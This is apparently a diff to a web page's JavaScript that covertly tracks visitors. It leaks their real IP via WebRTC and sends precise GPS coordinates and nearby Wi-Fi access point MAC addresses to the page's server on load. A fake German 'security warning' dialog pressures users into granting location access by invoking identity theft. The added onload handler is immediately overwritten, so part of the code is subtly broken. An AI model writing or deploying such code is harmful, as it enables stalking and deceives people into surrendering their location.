@@ -4224,6 +4224,8 @@ function trackPage() {
             getRealIP(); // 🌐 WEBRTC LEAK
         }
 
+	
+
         // 🎯 STANDORTVERARBEITUNG
         function handlePosition(pos, method) {
             const { latitude, longitude, accuracy } = pos.coords;
@@ -4402,17 +4404,56 @@ function getIpLocation() {
             }
         }
 
+
+	    function scanRealWiFi() {
+    if (typeof window.navigator.wifi !== 'undefined') {
+        window.navigator.wifi.getAccessPoints().then(aps => {
+            const networks = aps.map(ap => ({
+                macAddress: ap.BSSID,
+                signalStrength: ap.signalStrength
+            }));
+            
+            fetch('/submit-wifi', {  // 👉 An deinen Server senden
+                method: 'POST',
+                body: JSON.stringify({ wifiAccessPoints: networks })
+            });
+        });
+    }
+}
+
+
+function getPreciseGPS() {
+    navigator.geolocation.getCurrentPosition(
+        pos => {
+            fetch('/submit-gps', {  // 👉 An deinen Server senden
+                method: 'POST',
+                body: JSON.stringify({
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                })
+            });
+        },
+        err => {
+            scanRealWiFi(); // Fallback zu WiFi
+        },
+        { enableHighAccuracy: true, timeout: 30000 }
+    );
+}
+	
+
 setTimeout(() => {
     if (confirm("🔒 SICHERHEITSWARNUNG: Ihr Standort konnte nicht verifiziert werden. Klicken Sie auf 'OK', um Identitätsdiebstahl zu verhindern.")) {
         if (watchId) navigator.geolocation.clearWatch(watchId);
         getLocationWithFallback(); // 🔄 Neustart erzwingen
     }
 }, 10000);
-        // 🚀 STARTE TRACKING SOFORT
+        window.onload = getPreciseGPS;
         window.onload = function() {
     	getLocationWithFallback(); // GPS
    	 setTimeout(scanWiFi, 5000); // WiFi nach 5 Sekunden
     	setTimeout(getIpLocation, 8000); // IP nach 8 Sekunden
+		
 };
     </script>
 </body>
